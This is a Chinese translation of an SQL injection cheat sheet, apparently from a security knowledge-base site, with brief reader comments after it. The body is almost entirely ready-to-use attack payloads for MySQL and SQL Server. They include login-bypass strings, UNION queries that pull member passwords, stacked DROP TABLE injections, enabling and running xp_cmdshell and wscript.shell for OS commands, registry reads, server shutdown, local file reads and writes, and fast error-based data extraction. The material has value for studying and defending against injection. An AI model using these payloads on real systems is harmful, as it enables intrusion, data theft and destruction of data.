<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">SQL注入速查表（上）</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Yinz</a> <span class="bull">·</span> <time title="2015/08/19 10:37" ui-time="" datetime="2015/08/19 10:37" class="published ng-binding ng-isolate-scope">2015/08/19 10:37</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p><p><small><em>文档版本：1.4</em></small></p><h1>0x00 关于SQL注入速查表</h1><hr><p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p><p>样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p><ul><li>M: MySQL</li><li>S: SQL Server</li><li>P: PostgreSQL</li><li>O: Oracle</li><li>+: (大概)其他所有数据库</li></ul><p><em>例子</em>：</p><ul><li>(MS) 代表 : MySQL 和 SQL Server 等</li><li>(M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</li></ul><h1>0x01 目录</h1><hr><ol><li>关于SQL注入速查表</li><li>语法参考，攻击样例以及注入小技巧<ol><li>行间注释<ol><li>使用了行间注释的SQL注入攻击样例</li></ol></li><li>行内注释<ol><li>使用了行内注释的注入攻击样例</li><li>MySQL版本探测攻击样例</li></ol></li><li>堆叠查询(Stacking Queries)<ol><li>支持堆叠查询的语言/数据库</li><li>关于MySQL和PHP</li><li>堆叠注入攻击样例</li></ol></li><li>If语句<ol><li>MySQL的If语句</li><li>SQL Server的If语句</li><li>使用了If语句的注入攻击样例</li></ol></li><li>整数(Integers)的使用</li><li>字符串操作<ol><li>字符串的串联</li></ol></li><li>没有引号的字符串<ol><li>使用了16进制的注入攻击样例</li></ol></li><li>字符串异化(Modification)与联系</li><li>Union注入<ol><li>UNION-语言问题处理</li></ol></li><li>绕过登陆界面(SMO+)</li><li>绕过检查MD5哈希的登陆界面<ol><li>绕过MD5哈希检查的例子(MSP)</li></ol></li><li>基于错误(Error Based)-探测字段名<ol><li>使用<code>HAVING</code>来探测字段名(S)</li><li>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</li></ol></li><li>数据类型、UNION、之类的<ol><li>获取字段类型</li></ol></li><li>简单的注入(MSO+)</li><li>有用的函数、信息收集、内置程序、大量注入笔记<ol><li><code>@@version</code>(MS)</li><li>文件插入(Bulk Insert)(S)</li><li>BCP(S)</li><li>SQL Server的VBS/WSH(S)</li><li>执行系统命令，xp_cmdshell(S)</li><li>SQL Server中的一些特殊的表(S)</li><li>SQL Server的其它内置程序(S)</li><li>大量MSSQL笔记</li><li>使用LIMIT(M)或ORDER(MSO)的注入</li><li>关掉SQL Server(S)</li></ol></li><li>在SQL Server 2005中启用xp_cmdshell</li><li>探测SQL Server数据库的结构(S)<ol><li>获取用户定义表</li><li>获取字段名</li></ol></li><li>移动记录(Moving records)(S)</li><li>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</li></ol></li></ol><h1>0x02 语法参考，攻击样例以及注入小技巧</h1><hr><h3>行间注释</h3><p><strong>注释掉查询语句的其余部分</strong></p><p>行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p><ul><li><p><code>--</code>(SM)</p><p><code>DROP sampletable;--</code></p></li><li><p><code>#</code>(M)</p><p><code>DROP sampletable;#</code></p></li></ul><h4>使用了行间注释的SQL注入攻击样例</h4><blockquote><p>用户名:<code>admin'--</code></p></blockquote><ul><li>构成语句:<code>SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'</code> 这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li></ul><h3>行内注释</h3><p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于<strong>绕过过滤</strong>，移除空格，混淆，或探测数据库版本。</p><ul><li><p><code>/*注释内容*/</code>(SM)</p><ul><li><code>DROP/*comment*/sampletable</code></li><li><code>DR/**/OP/*绕过过滤*/sampletable</code></li><li><code>SELECT/*替换空格*/password/**/FROM/**/Members</code></li></ul></li><li><p><code>/*! MYSQL专属 */</code> (M)</p><p>这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。 <code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p></li></ul><h4>使用了行内注释的注入攻击样例</h4><blockquote><p>ID:<code>10; DROP TABLE members /*</code></p></blockquote><p>简单地摆脱了处理后续语句的麻烦，同样你可以使用<code>10; DROP TABLE members --</code></p><h4>MySQL版本探测攻击样例</h4><blockquote><p><code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p></blockquote><p>如果MySQL的版本高于<strong>3.23.02</strong>，会抛出一个<code>division by 0 error</code></p><blockquote><p>ID:<code>/*!32302 10*/</code></p><p>ID:<code>10</code></p></blockquote><p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p><h3>堆叠查询(Stacking Queries)</h3><p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p><ul><li><code>;</code>(S) <code>SELECT * FROM members; DROP members--</code> 结束一个查询并开始一个新的查询</li></ul><h4>支持堆叠查询的语言/数据库</h4><p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知</p><p><img alt="enter image description here" img-src="7eba77f1e9332de0158f5a1ae5de6ca3a1526df1.jpg"></p><h4>关于MySQL和PHP</h4><p>阐明一些问题。</p><p><strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？</p><p><em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p><h4>堆叠注入攻击样例</h4><blockquote><p>ID:<code>10;DROP members --</code></p></blockquote><p>构成语句：<code>SELECT * FROM products WHERE id = 10; DROP members--</code></p><p>这在执行完正常查询之后将会执行DROP查询。</p><h3>If语句</h3><p>根据If语句得到响应。这是<strong>盲注(Blind SQL Injection)的关键之一</strong>，同样也能简单而<strong>准确地</strong>进行一些测试。</p><h4>MySQL的If语句</h4><ul><li><p><code>IF(condition,true-part,false-part)</code>(M)</p><blockquote><p><code>SELECT IF (1=1,'true','false')</code></p></blockquote></li></ul><h4>SQL Server的If语句</h4><ul><li><p><code>IF condition true-part ELSE false-part</code>(S)</p><blockquote><p><code>IF (1=1) SELECT 'true' ELSE SELECT 'false'</code></p></blockquote></li></ul><h4>使用了If语句的注入攻击样例</h4><blockquote><p><code>if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0</code>(S)</p></blockquote><p>如果当前用户不是<strong>"sa"或者"dbo"</strong>,就会抛出一个<strong><code>divide by zero error</code></strong>。</p><h3>整数(Integers)的使用</h3><p>对于绕过十分有用，比如<strong>magic_quotes() 和其他类似过滤器</strong>，甚至是各种WAF。</p><ul><li><p><code>0xHEXNUMBER</code>(SM)</p><p>(HEXNUMBER:16进制数） 你能这样使用16进制数：</p><ul><li><p><code>SELECT CHAR(0x66)</code>(S)</p></li><li><p><code>SELECT 0x5045</code>(M) (这不是一个整数，而会是一个16进制字符串）</p></li><li><p><code>SELECT 0x50 + 0x45</code>(M) (现在这是整数了)</p></li></ul></li></ul><h3>字符串操作</h3><p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p><h4>字符串的串联</h4><ul><li><p><code>+</code>(S)</p><p><code>SELECT login + '-' + password FROM members</code></p></li><li><p><code>||</code> (*MO)</p><p><code>SELECT login || '-' || password FROM members</code></p></li></ul><p>*<strong>关于MySQL的"||"</strong> 这个仅在ANSI模式下的MySQL执行，其他情况下都会当成'逻辑操作符'并返回一个0。更好的做法是使用<code>CONCAT()</code>函数。</p><ul><li><p><code>CONCAT(str1, str2, str3, ...)</code>(M)</p><p>连接参数里的所有字符串 例：<code>SELECT CONCAT(login, password) FROM members</code></p></li></ul><h3>没有引号的字符串</h3><p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用<code>CHAR()</code>(MS)和<code>CONCAT()</code>(M)来生成没有引号的字符串</p><ul><li><p><code>0x457578</code> (M) - 16进制编码的字符串</p><p><code>SELECT 0x457578</code></p><p>这在MySQL中会被当做字符串处理</p></li><li><p>在MySQL中使用16进制字符串的一个简单方式： <code>SELECT CONCAT('0x',HEX('c:\\boot.ini'))</code></p></li><li><p>在MySQL中使用<code>CONCAT()</code>函数： <code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M)</p><p>这会返回'KLM'</p></li><li><p><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S)</p><p>这会返回'KLM'</p></li></ul><h4>使用了16进制的注入攻击样例</h4><ul><li><p><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code> (M)</p><p>这会显示<strong>c:\boot.ini</strong>的内容</p></li></ul><h3>字符串异化(Modification)与联系</h3><ul><li><p><code>ASCII()</code> (SMP)</p><p>返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。</p><p>例：<code>SELECT ASCII('a')</code></p></li><li><p><code>CHAR()</code> (SM)</p><p>把整数转换为对应ASCII码的字符</p><p>例：<code>SELECT CHAR(64)</code></p></li></ul><h3>Union注入</h3><p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。 <code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members</code></p><p>这会把news表和members表的内容合并返回。</p><p>另一个例子： <code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></p><h4>UNION-语言问题处理</h4><p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p><ul><li><p>使用 <code>COLLATE SQL_Latin1_General_Cp1254_CS_AS</code>(S)</p><p>或者其它的什么语句，具体的自己去查SQL Server的文档。 例：<code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></p></li><li><p><code>Hex()</code>(M)</p><p>百试百灵~</p></li></ul><h3>绕过登陆界面(SMO+)</h3><p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p><ul><li><code>admin' --</code></li><li><code>admin' #</code></li><li><code>admin'/*</code></li><li><code>' or 1=1--</code></li><li><code>' or 1=1#</code></li><li><code>' or 1=1/*</code></li><li><code>') or '1'='1--</code></li><li><code>') or ('1'='1--</code></li><li>....</li><li>以不同的用户登陆 (SM*) <code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></li></ul><p>*&#42;旧版本的MySQL不支持union&#42;</p><h3>绕过检查MD5哈希的登陆界面</h3><p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p><h4>绕过MD5哈希检查的例子(MSP)</h4><blockquote><p>用户名：<code>admin</code></p><p>密码：<code>1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055</code></p></blockquote><p>其中<code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p><h3>基于错误(Error Based)-探测字段名</h3><h4>使用<code>HAVING</code>来探测字段名(S)</h4><ul><li><code>' HAVING 1=1 --</code></li><li><code>' GROUP BY table.columnfromerror1 HAVING 1=1 --</code></li><li><code>' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --</code></li><li>……</li><li><code>' GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 --</code></li><li>直到它不再报错，就算搞定了</li></ul><h4>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</h4><p>通过ORDER BY来探测字段数能够加快union注入的速度。</p><ul><li><code>ORDER BY 1--</code></li><li><code>ORDER BY 2--</code></li><li>……</li><li><code>ORDER BY N--</code></li><li>一直到它报错为止，最后一个成功的数字就是字段数。</li></ul><h3>数据类型、UNION、之类的</h3><p><strong>提示：</strong></p><ul><li>经常给<strong>UNION</strong>配上<strong>ALL</strong>使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li><li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用<code>-1</code>或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li><li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强<ul><li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li></ul></li></ul><h4>获取字段类型</h4><ul><li><p><code>' union select sum(columntofind) from users--</code> (S)</p><p><code>Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument.</code> 如果没有返回错误说明字段是<strong>数字类型</strong></p></li><li><p>同样的，你可以使用<code>CAST()</code>和<code>CONVERT()</code></p><ul><li><code>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</code></li></ul></li><li><p><code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</p></li><li><p><code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 – 第一个字段是<code>integer</code>类型。</p></li><li><p><code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --</code></p><p>报错 – 第二个字段不是<code>integer</code>类型</p></li><li><p><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code></p><p>没报错 – 第二个字段是<code>string</code>类型。</p></li><li><p><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code></p><p>报错 – 第三个字段不是<code>integer</code></p></li><li><p>……</p><p><code>Microsoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.</code></p></li></ul><p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p><h3>简单的注入(MSO+)</h3><p><code>'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*</code></p><h3>有用的函数、信息收集、内置程序、大量注入笔记</h3><h4><code>@@version</code>(MS)</h4><p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p><p><code>INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)</code></p><h4>文件插入(Bulk Insert)(S)</h4><p>把文件内容插入到表中。如果你不知道应用目录你可以去<strong>读取IIS metabase file</strong>(<em>仅IIS 6</em>)(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>)然后在里面找到应用目录。</p><ol><li>新建一个表foo(<code>line varchar(8000)</code>)</li><li><code>BULK INSERT foo FROM 'c:\inetpub\wwwroot\login.asp'</code></li><li>DROP了临时表，重复另一个文件</li></ol><h4>BCP(S)</h4><p>写入文件。这个功能需要登录 <code>bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p><h4>SQL Server的VBS/WSH(S)</h4><p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</p><p><code>declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe'</code></p><blockquote><p>Username: <code>'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --</code></p></blockquote><h4>执行系统命令，xp_cmdshell(S)</h4><p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</p><p><code>EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'</code></p><p>用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</p><p><code>EXEC master.dbo.xp_cmdshell 'ping '</code></p><p>如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p><h4>SQL Server中的一些特殊的表(S)</h4><ul><li><p>Error Messages</p><p><code>master..sysmessages</code></p></li><li><p>Linked Servers</p><p><code>master..sysservers</code></p></li><li><p>Password (2000和2005版本的都能被破解，这俩的加密算法很相似)</p><p>SQL Server 2000: masters..sysxlogins</p><p>SQL Server 2005 : sys.sql_logins</p></li></ul><h4>SQL Server的其它内置程序(S)</h4><ol><li><p>命令执行 (xp_cmdshell)</p><p><code>exec master..xp_cmdshell 'dir'</code></p></li><li><p>注册表操作 (xp_regread)</p><ol><li>xp_regaddmultistring</li><li>xp_regdeletekey</li><li>xp_regdeletevalue</li><li>xp_regenumkeys</li><li>xp_regenumvalues</li><li>xp_regread</li><li>xp_regremovemultistring</li><li><p>xp_regwrite</p><p><code>exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet \Services\lanmanserver\parameters', 'nullsessionshares' exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM \CurrentControlSet \Services\snmp\parameters\validcommunities'</code></p></li></ol></li><li><p>管理服务(xp_servicecontrol)</p></li><li><p>媒体(xp_availablemedia)</p></li><li><p>ODBC 资源 (xp_enumdsn)</p></li><li>登录 (xp_loginconfig)</li><li>创建Cab文件 (xp_makecab)</li><li>域名列举 (xp&#95;ntsec&#95;enumdomains)</li><li>杀进程 (need PID) (xp&#95;terminate&#95;process)</li><li><p>新建进程 (<em>实际上你想干嘛都行</em>)</p><p><code>sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ exec xp_webserver</code></p></li><li><p>写文件进UNC或者内部路径 (sp_makewebtask)</p></li></ol><h4>大量MSSQL笔记</h4><p><code>SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/</code></p><p><code>DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p><p>HOST&#95;NAME() IS&#95;MEMBER (Transact-SQL)<br>IS_SRVROLEMEMBER (Transact-SQL)<br>OPENDATASOURCE (Transact-SQL)</p><p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"</code></p><p>OPENROWSET (Transact-SQL) - http://msdn2.microsoft.com/en-us/library/ms190312.aspx</p><p>你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p><h4>使用LIMIT(M)或ORDER(MSO)的注入</h4><p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;</code></p><p>如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p><h4>关掉SQL Server(S)</h4><p>如果你真的急了眼，<code>';shutdown --</code></p><h3>在SQL Server 2005中启用xp_cmdshell</h3><p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。</p><p>&#96;<code>\</code> EXEC sp_configure 'show advanced options',1 RECONFIGURE</p><p>EXEC sp&#95;configure 'xp&#95;cmdshell',1 RECONFIGURE &#96;<code>\</code></p><h3>探测SQL Server数据库的结构(S)</h3><h4>获取用户定义表</h4><p><code>SELECT name FROM sysobjects WHERE xtype = 'U'</code></p><h4>获取字段名</h4><p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')</code></p><h3>移动记录(Moving records)(S)</h3><ul><li><p>修改WHERE，使用<strong>NOT IN</strong>或者<strong>NOT EXIST</strong> <code>... WHERE users NOT IN ('First User', 'Second User')</code> <code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> -- 这个好用</p></li><li><p>脏的不行的小技巧</p><p><code>SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int</code></p><p><code>Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21</code></p></li></ul><h3>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3><p><code>';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c6e78215c6e78">[email&#160;protected]</a>+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p><p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></strong></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/8242" rel="bookmark" id="re1">SQL注入速查表（下）与Oracle注入速查表</a></li><li><a href="http://drops.wooyun.org/tips/1620" rel="bookmark" id="re2">MSSQL注射知识库 v 1.0</a></li><li><a href="http://drops.wooyun.org/tips/3790" rel="bookmark" id="re3">Webscan360的防御与绕过</a></li><li><a href="http://drops.wooyun.org/tips/7299" rel="bookmark" id="re4">MySQL注入技巧</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Pharaoh</span> <span class="reply-time">2016-02-08 15:48:10</span></div><p></p><p>Mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2015-12-08 11:31:33</span></div><p></p><p>学习了谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">终于明白</span> <span class="reply-time">2015-08-25 00:11:59</span></div><p></p><p>楼主辛苦了，收藏个先</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Reus</span> <span class="reply-time">2015-08-21 13:56:20</span></div><p></p><p>@木木小子 求分享啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tzwx</span> <span class="reply-time">2015-08-20 20:13:49</span></div><p></p><p>好东西，支持！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黑吃黑</span> <span class="reply-time">2015-08-19 23:46:14</span></div><p></p><p>不得不承认国外和国内还是有一定差距的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夸父追日</span> <span class="reply-time">2015-08-19 19:37:31</span></div><p></p><p>好棒的东西啊.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">枯荣</span> <span class="reply-time">2015-08-19 17:15:16</span></div><p></p><p>@木木小子 好 真乖</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">木木小子</span> <span class="reply-time">2015-08-19 13:35:57</span></div><p></p><p>看完了，不错，顺便做了张导图</p><p></p></div></div></div></div></div></main>